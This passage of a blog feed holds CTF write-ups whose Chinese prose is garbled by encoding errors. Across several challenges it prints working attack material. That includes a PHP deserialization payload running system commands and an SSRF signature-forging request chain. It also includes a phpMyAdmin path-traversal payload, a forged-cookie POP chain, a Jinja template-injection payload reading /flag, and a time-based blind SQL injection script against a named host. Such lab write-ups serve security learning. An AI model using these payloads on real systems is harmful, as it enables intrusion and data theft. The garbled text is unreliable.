    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[BJDCTF 2nd]å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€     </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>è¿™é“é¢˜å°±æ˜¯é‚£ç§æ”¹headerï¼ŒåŠ headerçš„é¢˜<br>ä¸»è¦è®°ä¸€ä¸‹æ¶‰åŠçš„å‡ ä¸ªheader        </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>payloadï¼š<img src="https://ftp.bmp.ovh/imgs/2021/02/e5ab0d1ef0567bdf.png">       </p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ul><li>Viaï¼šé€šçŸ¥ä¸­é—´ç½‘å…³æˆ–ä»£ç†æœåŠ¡å™¨åœ°å€ï¼Œé€šä¿¡åè®®      </li><li>From: å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·çš„Email        </li><li>Date:è¯·æ±‚å‘é€çš„æ—¥æœŸå’Œæ—¶é—´</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜039</title>
    <link href="/2021/02/27/BUU039/"/>
    <url>/2021/02/27/BUU039/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb<img src="https://ftp.bmp.ovh/imgs/2021/02/fc3331b9a95a064c.png">        </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>ä¸€æ®µæŠ¥é”™ä¿¡æ¯      </p><pre><code>Warning: date(): It is not safe to rely on the system&#39;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#39;UTC&#39; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 242021-02-27 06:14:05 am        </code></pre><p>è€Œä¸”æ²¡äº”ç§’é¡µé¢ä¼šåˆ·æ–°ä¸€æ¬¡  </p><p>æŠ“åŒ…çœ‹çœ‹<img src="https://ftp.bmp.ovh/imgs/2021/02/0efeb58411f3be9b.png"><br>å‰é¢ä¸€ä¸ªdate,åé¢æ˜¯æ—¶é—´â€”â€“å‡½æ•°æ‰§è¡Œ<br>è¯»å–<code>index.php</code><br><code>func=file_get_contents&amp;p=index.php</code>   </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    $disable_fun = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params">$func, $p</span>) </span>&#123;        $result = call_user_func($func, $p);        $a= gettype($result);        <span class="hljs-keyword">if</span> ($a == <span class="hljs-string">&quot;string&quot;</span>) &#123;            <span class="hljs-keyword">return</span> $result;        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;        <span class="hljs-keyword">var</span> $p = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;        <span class="hljs-keyword">var</span> $func = <span class="hljs-string">&quot;date&quot;</span>;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;                <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);            &#125;        &#125;    &#125;    $func = $_REQUEST[<span class="hljs-string">&quot;func&quot;</span>];    $p = $_REQUEST[<span class="hljs-string">&quot;p&quot;</span>];    <span class="hljs-keyword">if</span> ($func != <span class="hljs-literal">null</span>) &#123;        $func = strtolower($func);        <span class="hljs-keyword">if</span> (!in_array($func,$disable_fun)) &#123;            <span class="hljs-keyword">echo</span> gettime($func, $p);        &#125;<span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);        &#125;    &#125;</code></pre></code></pre><p>å¯ä»¥çœ‹åˆ°ç¦äº†å¾ˆå¤šå‡½æ•°<br>æœ‰ä¸ªclass<br>å¯ä»¥ç”¨ååºåˆ—<code>unserialize</code>å‡½æ•°      </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><pre><code>```php&lt;?phpclass Test &#123;    //var $p = &quot;find / -name &#39;flag*&#39;&quot;;    //var $p = &quot;ls /&quot;;    var $p = &quot;cat /tmp/flagoefiu4r93&quot;;    var $func = &quot;system&quot;;&#125;$a=new Test();$b=serialize($a);echo $b;       ```    </code></pre><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ul><li>åºåˆ—åŒ–</li><li><code>call_user_func</code>       <blockquote><p><code>call_user_func</code> â€” æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨<br><code> call_user_func ( callable $callback , mixed $parameter = ? , mixed $... = ? ) : mixed</code><br>ç¬¬ä¸€ä¸ªå‚æ•° callback æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚ </p></blockquote></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜038</title>
    <link href="/2021/02/26/BUU038/"/>
    <url>/2021/02/26/BUU038/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[De1CTF 2019]SSRF Me<br>hintï¼š<code>flag is in ./flag.txt</code>         </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><pre><code><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span><span class="hljs-comment">#encoding=utf-8</span><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> urllib<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> jsonreload(sys)sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)app = Flask(__name__)secert_key = os.urandom(<span class="hljs-number">16</span>)<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):</span>         <span class="hljs-comment">##å‡½æ•°--å„ä¸ªå®šä¹‰</span>        self.action = action        self.param = param        self.sign = sign        self.sandbox = md5(ip)        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):          <span class="hljs-comment">#SandBox For Remote_Addr</span>            os.mkdir(self.sandbox)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span>(<span class="hljs-params">self</span>):</span>         <span class="hljs-comment">##å‡½æ•°</span>        result = &#123;&#125;        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span>        <span class="hljs-keyword">if</span> (self.checkSign()):            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)                resp = scan(self.param)      <span class="hljs-comment">##æ‰«æç›®å½•</span>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp                <span class="hljs-keyword">else</span>:                    <span class="hljs-built_in">print</span> resp                    tmpfile.write(resp)                    tmpfile.close()                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()       <span class="hljs-comment">##è¯»å–</span>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span>        <span class="hljs-keyword">else</span>:            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span>        <span class="hljs-keyword">return</span> result    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span>(<span class="hljs-params">self</span>):</span>          <span class="hljs-comment">##æ£€æŸ¥</span>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><span class="hljs-comment">#generate Sign For Action Scan.</span><span class="hljs-meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])                 ##è·¯ç”±1----&gt;å¯¹ä¼ å‚åŠ å¯†</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span>():</span>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))    action = <span class="hljs-string">&quot;scan&quot;</span>    <span class="hljs-keyword">return</span> getSign(action, param)<span class="hljs-meta">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])              ##è·¯ç”±2------&gt;æ‰§è¡Œ</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span>():</span>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))    ip = request.remote_addr    <span class="hljs-keyword">if</span>(waf(param)):        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span>    task = Task(action, param, sign, ip)    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<span class="hljs-meta">@app.route(&#x27;/&#x27;)        ##è·¯ç”±3----&gt;é¦–é¡µ</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span>(<span class="hljs-params">param</span>):</span>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]    <span class="hljs-keyword">except</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span>(<span class="hljs-params">action, param</span>):</span>        <span class="hljs-comment">##åŠ å¯†å‡½æ•°</span>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">content</span>):</span>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params">param</span>):</span>    check=param.strip().lower()    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.debug = <span class="hljs-literal">False</span>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)</code></pre></code></pre><p>åˆ©ç”¨ç‚¹ï¼š     </p><pre><code>result[&#39;data&#39;] = f.read()        </code></pre><p>å‰ææ˜¯actioné‡Œæœ‰readå’Œscan,è¿˜è¦é€šè¿‡æ£€æŸ¥<br>å¯ä»¥é€šè¿‡è·¯ç”±1è·å¾—åŠ å¯†åçš„sign<br><code>geneSign()</code>é‡Œ<code>action=&quot;scan&quot;</code>æ‰€ä»¥æˆ‘ä»¬è¦åœ¨paramé‡ŒåŠ ä¸Šread<br>è·å¾—signå<br>åœ¨è·¯ç”±2é‡Œä¿®æ”¹cookieä¼ å‚å³å¯        </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>payloadï¼š</p><pre><code>/geneSign?param=flag.txtread       </code></pre><p>å¾—åˆ°sign:<code>411d8c10d1b90c5c4e39c1904652f8c0</code>       </p><pre><code>/De1ta?param=flag.txt      cookie: action=readscan;sign=411d8c10d1b90c5c4e39c1904652f8c0        </code></pre><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p>flaskä»£ç å®¡è®¡<br>è™½ç„¶çœ‹äº†çœ‹flaskçš„åŸºæœ¬çŸ¥è¯†ï¼Œä½†çœ‹åˆ°ä¸€å¤§æ®µä»£ç æ—¶æ€»æŠ“ä¸åˆ°é‡ç‚¹ï¼Œè¿˜è¦å¤šçœ‹çœ‹     </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜037</title>
    <link href="/2021/02/25/BUU037/"/>
    <url>/2021/02/25/BUU037/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“<img src="https://ftp.bmp.ovh/imgs/2021/02/8714abd7c1fa4046.png">         </p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>ç›®å½•æ‰«æåˆ°<code>phpmyadmin</code>(ä¸ºä»€ä¹ˆæˆ‘çš„å°±æ‰«ä¸åˆ°ï¼Ÿå¾¡å‰‘ï¼Œdirsearch,dirbéƒ½æ‰«ä¸åˆ°ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ)<br>ç„¶åæ˜¯phpmyadmin4.81çš„ä¸€ä¸ªè¿œç¨‹æ–‡ä»¶è¯»å–æ¼æ´      </p><h2 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h2><p>payloadï¼š<code>/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</code><br>å¾—åˆ°flag   </p><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p><a href="https://blog.csdn.net/weixin_43872099/article/details/104128639">CVE-2018-12613</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgameweek3</title>
    <link href="/2021/02/24/hgameweek3/"/>
    <url>/2021/02/24/hgameweek3/</url>
    
    <content type="html"><![CDATA[<h2 id="Arknights"><a href="#Arknights" class="headerlink" title="Arknights"></a>Arknights</h2><p>é¢˜ç›®æè¿°ï¼š<code>........r4uç”¨gitéƒ¨ç½²åˆ°äº†è‡ªå·±çš„æœåŠ¡å™¨ä¸Š......</code><br>æç¤º<code>.git</code>æ³„éœ²<br>githackä¸€ä¸‹å¾—åˆ°æºç      </p><pre><code>//index.php&lt;?phperror_reporting(0);require_once (&quot;simulator.php&quot;);$simulator = new Simulator();$cards = array();if(isset($_POST[&quot;draw&quot;]))&#123;    $cards = $simulator-&gt;draw($_POST[&quot;draw&quot;]);&#125;?&gt;//simulator.php&lt;?phpclass Simulator&#123;    public $session;    public $cardsPool;    public function __construct()&#123;        $this-&gt;session = new Session();        if(array_key_exists(&quot;session&quot;, $_COOKIE))&#123;            $this-&gt;session-&gt;extract($_COOKIE[&quot;session&quot;]);     #éªŒè¯cookie        &#125;        $this-&gt;cardsPool = new CardsPool(&quot;./pool.php&quot;);        $this-&gt;cardsPool-&gt;init();    &#125;    public function draw($count)&#123;        $result = array();        for($i=0; $i&lt;$count; $i++)&#123;            $card = $this-&gt;cardsPool-&gt;draw();            if($card[&quot;stars&quot;] == 6)&#123;                $this-&gt;session-&gt;set(&#39;&#39;, $card[&quot;No&quot;]);            &#125;            $result[] = $card;        &#125;        $this-&gt;session-&gt;save();        return $result;    &#125;    public function getLegendary()&#123;        $six = array();        $data = $this-&gt;session-&gt;getAll();        foreach ($data as $item) &#123;            $six[] = $this-&gt;cardsPool-&gt;cards[6][$item];        &#125;        return $six;    &#125;&#125;class CardsPool&#123;    public $cards;    private $file;    public function __construct($filePath)    &#123;        if (file_exists($filePath)) &#123;            $this-&gt;file = $filePath;        &#125; else &#123;            die(&quot;Cards pool file doesn&#39;t exist!&quot;);        &#125;    &#125;    public function draw()    &#123;        $rand = mt_rand(1, 100);        $level = 0;        if ($rand &gt;= 1 &amp;&amp; $rand &lt;= 42) &#123;            $level = 3;        &#125; elseif ($rand &gt;= 43 &amp;&amp; $rand &lt;= 90) &#123;            $level = 4;        &#125; elseif ($rand &gt;= 91 &amp;&amp; $rand &lt;= 99) &#123;            $level = 5;        &#125; elseif ($rand == 100) &#123;            $level = 6;        &#125;        $rand_key = array_rand($this-&gt;cards[$level]);        return array(            &quot;stars&quot; =&gt; $level,            &quot;No&quot; =&gt; $rand_key,            &quot;card&quot; =&gt; $this-&gt;cards[$level][$rand_key]        );    &#125;    public function init()    &#123;        $this-&gt;cards = include($this-&gt;file);    &#125;    public function __toString()&#123;        return file_get_contents($this-&gt;file);    &#125;&#125;class Session&#123;    private $sessionData;    const SECRET_KEY = &quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;;    public function __construct()&#123;&#125;    public function set($key, $value)&#123;        if(empty($key))&#123;            $this-&gt;sessionData[] = $value;        &#125;else&#123;            $this-&gt;sessionData[$key] = $value;        &#125;    &#125;    public function getAll()&#123;        return $this-&gt;sessionData;    &#125;    public function save()&#123;               #ç”Ÿæˆcookie        $serialized = serialize($this-&gt;sessionData);        $sign = base64_encode(md5($serialized . self::SECRET_KEY));        $value = base64_encode($serialized) . &quot;.&quot; . $sign;        setcookie(&quot;session&quot;,$value);       &#125;    public function extract($session)&#123;     #éªŒè¯        $sess_array = explode(&quot;.&quot;, $session);        $data = base64_decode($sess_array[0]);        $sign = base64_decode($sess_array[1]);        if($sign === md5($data . self::SECRET_KEY))&#123;            $this-&gt;sessionData = unserialize($data);        &#125;else&#123;            unset($this-&gt;sessionData);            die(&quot;Go away! You hacker!&quot;);        &#125;    &#125;&#125;class Eeeeeeevallllllll&#123;    public $msg=&quot;åålikiåˆ°æ­¤ä¸€æ¸¸&quot;;    public function __destruct()    &#123;        echo $this-&gt;msg;    &#125;&#125;     </code></pre><p>é€šçœ‹ä¸€éçš„è¯ï¼Œä¸»è¦çœ‹åˆ°å‡ ä¸ªé­”æ³•å‡½æ•°<br>å…¶ä¸­ï¼š     </p><pre><code>public function __toString()&#123;        return file_get_contents($this-&gt;file);    &#125;        </code></pre><p><code>file_get_content</code>å¯ä»¥è®©æˆ‘ä»¬è¯»å–æ–‡ä»¶<br>æœ€åçš„echoå¯ä»¥è§¦å‘<code>__toString</code><br>ç„¶åæ˜¯é‚£ä¸ª<code>unserialize</code><br>æƒ³è¦ååºåˆ—åŒ–ï¼Œå¿…é¡»æ»¡è¶³cookie<br>æ‰€ä»¥éœ€è¦çœ‹cookieçš„ç”Ÿæˆæ¥è‡ªå·±æ„é€ cookie     </p><pre><code>&lt;?phpclass Eeeeeeevallllllll&#123;    public $msg;&#125;class CardsPool&#123;    public $file=&quot;./flag.php&quot;;&#125;$a=new Eeeeeeevallllllll();$a-&gt;msg=new CardsPool();$b=serialize($a);echo $b.&quot;\n&quot;;$SECRET_KEY=&quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;;$sign = base64_encode(md5($b . $SECRET_KEY));$value = base64_encode($b) . &quot;.&quot; . $sign;echo $value;?&gt;   </code></pre><p>è¿™ä¸ªå‡ºæ¥çš„å’Œwpç›¸æ¯”å·®äº†ä¸€äº›ï¼Œä½†å¯ä»¥å¾—åˆ°flag             </p><p>ååºåˆ—åŒ–å<code>$this-&gt;sessionData = unserialize($data);</code><br>æœ€åè§¦å‘<code>__toString</code><br>è¿”å›flag<br>..<br>..<br>..<br>â€¦<br>è¿˜æ˜¯æœ‰ç‚¹æ‡µâ€¦â€¦â€¦.å…ˆå°±è¿™å§        </p><h2 id="Forgetful"><a href="#Forgetful" class="headerlink" title="Forgetful"></a>Forgetful</h2><p>é¢˜ç›®æè¿°ï¼š<code>.........Python å†™äº†ä¸€ä¸ª TodoList.....</code><br>æ¨¡æ¿æ³¨å…¥<br>æ³¨å†Œåå‘ä¸€ä¸ªå·²å®Œæˆçš„<code>&#123;&#123;7*7&#125;&#125;</code>æŸ¥çœ‹åæ˜¯49        </p><p>è¿‡æ»¤     </p><p>åŒ…å« <code>hgame</code> å’Œ <code>emagh</code> çš„å­—ç¬¦ä¸²éƒ½ä¼šè¢«æ›¿æ¢ä¸º <code>Stop!!!</code><br>å¯ä»¥ä»¥<code>base64</code>è¾“å‡º<br>payload:<code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag | base64').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>          </p><h2 id="Liki-Jail"><a href="#Liki-Jail" class="headerlink" title="Liki-Jail"></a>Liki-Jail</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/02/f2a261a9c5cd3ea3.png"><br>ä¸€ä¸ªç™»å½•ç•Œé¢<br>æ­£å¸¸è¾“å…¥ï¼Œå›æ˜¾æ˜¯<code>WARNING! LOGIN FIALED! System is being maintained.</code>ä¸€ä¸ªå¼¹çª—<br>å¸¦ç¬¦å·çš„è¯ï¼Œå›æ˜¾æ˜¯<code> Invalid username</code>å¼¹çª—<br>wpä¸­<br>SQLè¯­å¥æ˜¯ï¼š<code>SELECT * FROM `u5ers` WHERE `usern@me`=&#39;$username&#39; and `p@ssword`=&#39;$password&#39;</code><br>ç„¶åå¯ä»¥ç”¨<code>\</code>è½¬ä¹‰ç¬¬äºŒä¸ª<code>&#39;</code><br><code>username=admin\</code><br><code>password=or 1=1#</code><br>åŸè¯­å¥å°±å˜ä¸º:<code> WHERE `usern@me`=&#39;admin\&#39;or 1=1#&#39;</code><br>æ—¶é—´ç›²æ³¨ï¼š      </p><p>æšä¸¾æ³•ï¼š       </p><pre><code>import requestsimport timeimport datetimeurl=&quot;https://jailbreak.liki.link/login.php&quot;flag=&quot;&quot;for i in range(1,100):    for j in range(31,128):        #payload=&quot;/**/or/**/if(ascii(substr(database(),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),1)#&quot;.format(i,j)        #payload=&quot;/**/or/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),1)#&quot;.format(i,j)        #payload=&quot;/**/or/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),1)#&quot;.format(i,j)        payload=&quot;/**/or/**/if(ascii(substr((select/**/group_concat(`usern@me`,0x2c,`p@ssword`)/**/from/**/u5ers),&#123;&#125;,1))/**/like/**/&#123;&#125;,sleep(3),1)#&quot;.format(i,j)        data=&#123;&quot;username&quot;:&quot;admin\\&quot;,&quot;password&quot;:payload&#125;        time1 = datetime.datetime.now()        res=requests.post(url=url,data=data)        time2 = datetime.datetime.now()        tem=(time2-time1).seconds        if tem&gt;2:            flag=flag+chr(j)            print(flag)            break        else:            j=j+1        </code></pre><p>ç„¶åæ˜¯ç”¨python fuzzè¿‡æ»¤çš„ç¬¦å·â€”å­¦åˆ°äº†     </p><pre><code>import requestsurl=&#39;https://jailbreak.liki.link/login.php&#39;str=&#39;WARNING! LOGIN FIALED!&#39;for i in range(30,128):    st=chr(i)    data=&#123;&#39;username&#39;:st,&#39;password&#39;:st&#125;    r=requests.post(url=url,data=data)    if str not in r.text:        print(st)</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜036</title>
    <link href="/2021/02/24/BUU036/"/>
    <url>/2021/02/24/BUU036/</url>
    
